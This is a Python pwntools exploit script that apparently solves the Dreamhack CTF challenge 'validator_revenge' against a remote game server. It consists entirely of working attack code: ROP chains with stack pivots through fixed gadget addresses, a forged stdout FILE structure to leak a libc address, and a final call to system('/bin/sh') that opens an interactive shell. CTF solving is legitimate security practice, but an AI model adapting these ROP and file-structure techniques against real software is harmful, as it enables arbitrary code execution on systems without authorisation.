#!/usr/bin/env python3

from pwn import *

exe = ELF("./validator_revenge_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.log_level = "debug"
context.terminal = ['kgx', '--', 'bash', '-c']

def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug ([exe.path], "b *0x40079d", env={'SHELL': '/bin/bash'})
        # r = gdb.debug ([exe.path], env={'SHELL': '/bin/bash'})
        # r = gdb.debug ([exe.path], "b *__libc_start_main+214", env={'SHELL': '/bin/bash'})
    else:
        r = remote("host3.dreamhack.games", 15673)

    return r


def main():
    p = conn()
    
    first_part = b"DREAMHACK!"
    for i in range(0x80 - 10, 0, -1):
        first_part += p8(i)

    pop_rdi = 0x400873
    pop_rsi = 0x40068b
    pop_rdx = 0x400694
    pop_rbp = 0x400608
    leave_ret = 0x40079b
    main = 0x4007c5
    pop_rsp_r13_r14_r15 = 0x40086d
    ret = leave_ret + 1

    payload = first_part
    payload += p64 (0x601800)
    payload += p64 (main)
    payload += (0x400 - len (payload)) * b'\x00'
    p.send (payload)

    payload = first_part
    payload += p64 (0x601810) + p64 (0x4007ec) # fflush in main and _IO_2_1_stdout will be at 0x6017d8
    payload += p64 (0) + p64 (pop_rdi) + p64 (0)
    payload += p64 (pop_rsi) + p64 (0x6017d8 - 8 * 4)
    payload += p64 (pop_rdx) + p64 (0x20)
    payload += p64 (exe.plt['read'])
    payload += p64 (pop_rdi) + p64 (0)
    payload += p64 (pop_rsi) + p64 (0x6017e0)
    payload += p64 (pop_rdx) + p64 (0x68)
    payload += p64 (exe.plt['read'])
    payload += p64 (pop_rbp) + p64 (0x601810)
    payload += p64 (pop_rsp_r13_r14_r15) + p64 (0x6017d8 - 8 * 4)
    payload += (0x400 - len (payload)) * b'\x00' 
    p.send (payload)

    payload = p64 (0) * 3 + p64 (pop_rsi)
    p.send (payload)

    payload = p64 (pop_rdi) + p64 (0)
    payload += p64 (pop_rdx) + p64 (0x40)
    payload += p64 (exe.plt['read'])
    payload += p64 (0x4007ec)
    payload += p64 (0)
    payload += p64 (pop_rdi) + p64 (0)
    payload += p64 (pop_rsi) + p64 (0x601830)
    payload += p64 (pop_rdx) + p64 (0x18)

    p.send (payload)

    fake_fp = p64(0x00000000fbad2887) # flag
    fake_fp += p64(0) # read_ptr
    fake_fp += p64(0x601020) # read_end
    fake_fp += p64(0) # read_base
    fake_fp += p64(0x601020) # write_base
    fake_fp += p64(0x601020 + 0x100) # write_ptr
    fake_fp += p64(0) # write_end
    fake_fp += p64(0) # buf_base
    fake_fp += p64(0x100)
    p.send(fake_fp)

    leak_stdout = u64(p.recv(8))
    print ("The address of _IO_2_1_stdout_ is: ", hex (leak_stdout))
    libc.address = leak_stdout - libc.sym['_IO_2_1_stdout_']
    print ("The address of libc is:", hex (libc.address))

    bin_sh = next (libc.search (b'/bin/sh'))
    payload = p64 (pop_rdi) + p64 (bin_sh)
    payload += p64 (libc.sym['system'])
    p.send (payload)
    


    p.interactive()


if __name__ == "__main__":
    main()
